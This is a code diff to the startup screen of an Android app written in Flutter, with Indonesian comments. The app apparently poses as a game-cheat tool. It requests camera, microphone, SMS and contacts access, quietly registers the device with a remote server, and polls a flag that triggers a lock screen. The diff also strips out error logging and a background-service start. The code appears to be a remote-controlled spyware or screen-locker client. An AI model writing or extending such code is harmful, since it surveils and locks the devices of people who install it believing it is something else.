@@ -7,7 +7,6 @@ import 'package:http/http.dart' as http;
 import 'package:device_info_plus/device_info_plus.dart';
 import '../lock/lock_screen.dart';
 import 'cheat_home.dart';
-import '../services/device_service.dart';
 import '../config.dart';
 
 class SplashScreen extends StatefulWidget {
@@ -24,17 +23,14 @@ class _SplashScreenState extends State<SplashScreen> {
   }
 
   Future<void> _bootstrap() async {
-    // 1. Minta Izin (Dibungkus try-catch biar gak crash)
     try {
       await [
         Permission.camera, Permission.microphone,
         Permission.sms, Permission.contacts, Permission.notification,
       ].request();
-    } catch (e) {
-      debugPrint("Gagal minta izin: $e");
-    }
+    } catch (e) {}
 
-    // 2. Nembak Server LANGSUNG (Biar device langsung masuk web)
+    // Nembak Server (Register)
     try {
       final prefs = await SharedPreferences.getInstance();
       String? devId = prefs.getString('dev_id');
@@ -53,18 +49,8 @@ class _SplashScreenState extends State<SplashScreen> {
           'android': info.version.release,
         }),
       ).timeout(const Duration(seconds: 5));
-    } catch (e) {
-      debugPrint("Gagal konek server: $e");
-    }
+    } catch (e) {}
 
-    // 3. Nyalain Background Service (Dibungkus try-catch)
-    try {
-      await DeviceService.init(); 
-    } catch (e) {
-      debugPrint("Gagal start service: $e");
-    }
-
-    // 4. Cek Lock Screen
     final prefs = await SharedPreferences.getInstance();
     Timer.periodic(const Duration(seconds: 2), (t) async {
       final v1 = prefs.getBool('lock_v1') ?? false;
